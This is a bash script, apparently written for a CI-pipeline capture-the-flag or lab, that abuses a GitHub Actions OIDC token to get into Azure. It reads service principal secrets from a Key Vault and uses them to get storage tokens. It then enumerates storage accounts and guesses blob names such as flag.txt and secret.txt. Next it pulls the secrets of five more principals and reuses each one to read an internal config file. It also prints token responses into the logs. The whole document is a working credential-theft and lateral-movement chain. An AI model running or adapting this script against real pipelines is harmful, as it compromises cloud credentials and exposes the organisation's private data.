#!/usr/bin/env bash
set -x
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "OIDC len: ${#OIDC}"
KVTOKEN=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)
echo "KV len: ${#KVTOKEN}"
RVSEC=$(curl -s -H "Authorization: Bearer $KVTOKEN" \
  "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-viewer-principal?api-version=7.4" | jq -r .value)
RV_APP=$(echo "$RVSEC" | jq -r .appId)
RV_KEY=$(echo "$RVSEC" | jq -r .clientSecret)
echo "RV app: $RV_APP"
STORTOKEN=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$RV_APP" -d "grant_type=client_credentials" -d "client_secret=$RV_KEY" \
  --data-urlencode "scope=https://storage.azure.com/.default" | tee /dev/stderr | jq -r .access_token)
echo "ST len: ${#STORTOKEN}"
for A in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
  echo "=== $A ==="
  curl -s -H "Authorization: Bearer $STORTOKEN" -H "x-ms-version: 2021-08-06" "https://$A.blob.core.windows.net/?comp=list"
  for C in config internal secrets data flag; do
    curl -s -H "Authorization: Bearer $STORTOKEN" -H "x-ms-version: 2021-08-06" "https://$A.blob.core.windows.net/$C?restype=container&comp=list"
    for B in internal-config.json flag.txt flag secret.txt; do
      R=$(curl -s -H "Authorization: Bearer $STORTOKEN" -H "x-ms-version: 2021-08-06" "https://$A.blob.core.windows.net/$C/$B")
      echo ">>> $A/$C/$B: $R"
    done
  done
done
echo "=== ALL SPs ==="
for SP in cost-reader-principal directory-audit-principal reporting-service-principal secrets-sync-principal sync-service-principal; do
  S=$(curl -s -H "Authorization: Bearer $KVTOKEN" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SP?api-version=7.4" | jq -r .value)
  SA=$(echo "$S"|jq -r .appId); SK=$(echo "$S"|jq -r .clientSecret)
  T=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$SA" -d "grant_type=client_credentials" -d "client_secret=$SK" \
    --data-urlencode "scope=https://storage.azure.com/.default" | jq -r .access_token)
  echo "$SP token len: ${#T}"
  if [ ${#T} -gt 100 ]; then
    curl -s -H "Authorization: Bearer $T" -H "x-ms-version: 2021-08-06" "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json"
    echo
  fi
done
echo "=== DONE ==="
